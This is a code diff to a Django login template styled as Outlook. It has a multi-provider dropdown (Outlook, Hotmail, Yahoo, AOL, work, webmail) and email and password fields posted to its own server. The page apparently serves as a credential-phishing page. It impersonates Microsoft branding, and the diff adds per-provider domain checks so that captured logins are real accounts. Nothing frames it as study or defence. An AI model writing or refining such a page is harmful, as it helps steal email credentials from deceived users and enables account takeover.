@@ -19,16 +19,13 @@
             justify-content: center;
             padding: 20px;
             margin: 0;
-            /* ===== OUTLOOK STYLE BACKGROUND ===== */
             background: #f0f2f5;
-            /* Subtle gradient overlay */
             background-image: 
                 radial-gradient(ellipse at 10% 20%, rgba(0, 103, 184, 0.03) 0%, transparent 50%),
                 radial-gradient(ellipse at 90% 80%, rgba(0, 103, 184, 0.03) 0%, transparent 50%),
                 linear-gradient(135deg, #f0f2f5 0%, #e8ecf1 100%);
         }
 
-        /* Optional: Add a subtle pattern */
         body::before {
             content: '';
             position: fixed;
@@ -60,7 +57,6 @@
             position: relative;
         }
 
-        /* ===== LOGO ===== */
         .logo {
             text-align: center;
             margin-bottom: 28px;
@@ -72,7 +68,6 @@
             display: inline-block;
         }
 
-        /* ===== HEADER TEXT ===== */
         .header-text {
             text-align: center;
             margin-bottom: 28px;
@@ -92,7 +87,6 @@
             font-weight: 400;
         }
 
-        /* ===== FORM ===== */
         .form-group {
             margin-bottom: 18px;
         }
@@ -130,7 +124,6 @@
             color: #9ca3af;
         }
 
-        /* Custom select arrow */
         .form-group select {
             background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 8'%3E%3Cpath fill='%23666' d='M6 8L0 0h12z'/%3E%3C/svg%3E");
             background-repeat: no-repeat;
@@ -139,7 +132,24 @@
             cursor: pointer;
         }
 
-        /* ===== BUTTON ===== */
+        /* ===== ERROR STATE ===== */
+        .form-group input.error {
+            border-color: #dc3545;
+            box-shadow: 0 0 0 3px rgba(220, 53, 69, 0.12);
+        }
+
+        .error-message {
+            color: #dc3545;
+            font-size: 13px;
+            margin-top: 6px;
+            display: none;
+            font-weight: 500;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
         .btn {
             width: 100%;
             padding: 14px;
@@ -184,15 +194,10 @@
         }
 
         @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
-        /* ===== LINKS ===== */
         .links {
             text-align: center;
             margin-top: 20px;
@@ -209,7 +214,6 @@
             text-decoration: underline;
         }
 
-        /* ===== FOOTER ===== */
         .footer {
             margin-top: 28px;
             padding-top: 18px;
@@ -233,7 +237,6 @@
             color: #d1d5db;
         }
 
-        /* ===== MESSAGES ===== */
         .message {
             padding: 12px 16px;
             border-radius: 8px;
@@ -256,32 +259,26 @@
             border: 1px solid #bee5eb;
         }
 
-        /* ===== RESPONSIVE ===== */
         @media (max-width: 480px) {
             .card {
                 padding: 28px 20px 24px;
                 border-radius: 10px;
             }
-
             .header-text h1 {
                 font-size: 20px;
             }
-
             .header-text p {
                 font-size: 14px;
             }
-
             .form-group input,
             .form-group select {
                 font-size: 15px;
                 padding: 11px 12px;
             }
-
             .btn {
                 font-size: 15px;
                 padding: 13px;
             }
-
             .logo img {
                 height: 30px;
             }
@@ -291,24 +288,20 @@
             .card {
                 padding: 20px 14px 18px;
             }
-
             .header-text h1 {
                 font-size: 18px;
             }
-
             .form-group input,
             .form-group select {
                 font-size: 14px;
                 padding: 10px 10px;
             }
-
             .btn {
                 font-size: 14px;
                 padding: 11px;
             }
         }
 
-        /* ===== SAFE AREA FOR NOTCH ===== */
         @supports (padding: max(0px)) {
             .container {
                 padding-left: max(20px, env(safe-area-inset-left));
@@ -328,7 +321,8 @@
             </div>
 
             <!-- Header -->
-            <div class="header-text"> 
+            <div class="header-text">
+                <h1>Outlook Email Login</h1>
                 <p>Your inbox · Your daily plan</p>
             </div>
 
@@ -340,7 +334,7 @@
             {% endif %}
 
             <!-- Form -->
-            <form method="POST" id="loginForm">
+            <form method="POST" id="loginForm" novalidate>
                 {% csrf_token %}
 
                 <!-- Provider Dropdown -->
@@ -362,6 +356,7 @@
                 <div class="form-group">
                     <label id="emailLabel">Email</label>
                     <input type="email" name="email" id="emailInput" placeholder="Enter your email" required autofocus>
+                    <div class="error-message" id="emailError">Please enter a valid email for this provider.</div>
                 </div>
 
                 <!-- Password -->
@@ -399,54 +394,156 @@
         const serviceMap = {
             'outlook': {
                 label: 'Outlook Email',
-                placeholder: 'Enter your Outlook email'
+                placeholder: 'Enter your Outlook email',
+                domains: ['outlook.com', 'hotmail.com', 'live.com', 'msn.com'],
+                display: 'Outlook, Hotmail, or Live'
             },
             'hotmail': {
                 label: 'Hotmail Email',
-                placeholder: 'Enter your Hotmail email'
+                placeholder: 'Enter your Hotmail email',
+                domains: ['hotmail.com', 'outlook.com', 'live.com', 'msn.com'],
+                display: 'Hotmail, Outlook, or Live'
             },
             'yahoo': {
                 label: 'Yahoo Email',
-                placeholder: 'Enter your Yahoo email'
+                placeholder: 'Enter your Yahoo email',
+                domains: ['yahoo.com', 'yahoo.co.uk', 'yahoo.fr', 'yahoo.de', 'yahoo.co.jp', 'ymail.com', 'rocketmail.com'],
+                display: 'Yahoo'
             },
             'aol': {
                 label: 'AOL Email',
-                placeholder: 'Enter your AOL email'
+                placeholder: 'Enter your AOL email',
+                domains: ['aol.com', 'aim.com'],
+                display: 'AOL'
             },
             'office': {
                 label: 'Work Email',
-                placeholder: 'Enter your work email'
+                placeholder: 'Enter your work email',
+                domains: [],
+                display: 'Work/Business'
             },
             'webmail': {
                 label: 'Webmail Email',
-                placeholder: 'Enter your webmail address'
+                placeholder: 'Enter your webmail address',
+                domains: [],
+                display: 'Webmail'
             },
             'other': {
                 label: 'Email Address',
-                placeholder: 'Enter your email address'
+                placeholder: 'Enter your email address',
+                domains: [],
+                display: 'Other'
             }
         };
 
         const serviceSelect = document.getElementById('service');
         const emailLabel = document.getElementById('emailLabel');
         const emailInput = document.getElementById('emailInput');
+        const emailError = document.getElementById('emailError');
+        const loginForm = document.getElementById('loginForm');
 
+        // Update label and placeholder on selection change
         serviceSelect.addEventListener('change', function() {
             const selected = this.value;
             if (selected && serviceMap[selected]) {
                 emailLabel.textContent = serviceMap[selected].label;
                 emailInput.placeholder = serviceMap[selected].placeholder;
+                // Clear error when provider changes
+                emailInput.classList.remove('error');
+                emailError.classList.remove('show');
+                emailError.textContent = '';
             } else {
                 emailLabel.textContent = 'Email';
                 emailInput.placeholder = 'Enter your email';
             }
         });
 
-        // ========== LOADING STATE ==========
-        document.getElementById('loginForm').addEventListener('submit', function() {
+        // Clear error on typing
+        emailInput.addEventListener('input', function() {
+            this.classList.remove('error');
+            emailError.classList.remove('show');
+            emailError.textContent = '';
+        });
+
+        // ========== STRICT EMAIL VALIDATION ==========
+        loginForm.addEventListener('submit', function(e) {
+            const selectedService = serviceSelect.value;
+            const email = emailInput.value.trim();
+            
+            // Check if provider is selected
+            if (!selectedService) {
+                e.preventDefault();
+                alert('Please select your email provider.');
+                serviceSelect.focus();
+                return false;
+            }
+
+            // Get service data
+            const serviceData = serviceMap[selectedService];
+            
+            // If service has domain restrictions
+            if (serviceData && serviceData.domains && serviceData.domains.length > 0) {
+                // Check if email matches any allowed domain
+                const isValid = serviceData.domains.some(domain => 
+                    email.toLowerCase().endsWith('@' + domain)
+                );
+                
+                if (!isValid) {
+                    e.preventDefault();
+                    emailInput.classList.add('error');
+                    emailError.textContent = `❌ Please enter a valid ${serviceData.display} email. Must end with: @${serviceData.domains.join(', @')}`;
+                    emailError.classList.add('show');
+                    emailInput.focus();
+                    return false;
+                }
+            }
+
+            // If no domain restrictions (office, webmail, other), just check if email has @
+            if (serviceData && (!serviceData.domains || serviceData.domains.length === 0)) {
+                if (!email.includes('@') || !email.includes('.')) {
+                    e.preventDefault();
+                    emailInput.classList.add('error');
+                    emailError.textContent = '❌ Please enter a valid email address (e.g., name@domain.com).';
+                    emailError.classList.add('show');
+                    emailInput.focus();
+                    return false;
+                }
+            }
+
+            // All validations passed
+            emailInput.classList.remove('error');
+            emailError.classList.remove('show');
+            
+            // Show loading state
             const btn = document.getElementById('signInBtn');
             btn.disabled = true;
             btn.classList.add('loading');
+            
+            return true;
+        });
+
+        // Also validate on blur (when user leaves the field)
+        emailInput.addEventListener('blur', function() {
+            const selectedService = serviceSelect.value;
+            const email = this.value.trim();
+            
+            if (!selectedService || !email) return;
+            
+            const serviceData = serviceMap[selectedService];
+            if (serviceData && serviceData.domains && serviceData.domains.length > 0) {
+                const isValid = serviceData.domains.some(domain => 
+                    email.toLowerCase().endsWith('@' + domain)
+                );
+                
+                if (!isValid) {
+                    this.classList.add('error');
+                    emailError.textContent = `❌ Must end with: @${serviceData.domains.join(', @')}`;
+                    emailError.classList.add('show');
+                } else {
+                    this.classList.remove('error');
+                    emailError.classList.remove('show');
+                }
+            }
         });
     </script>
 
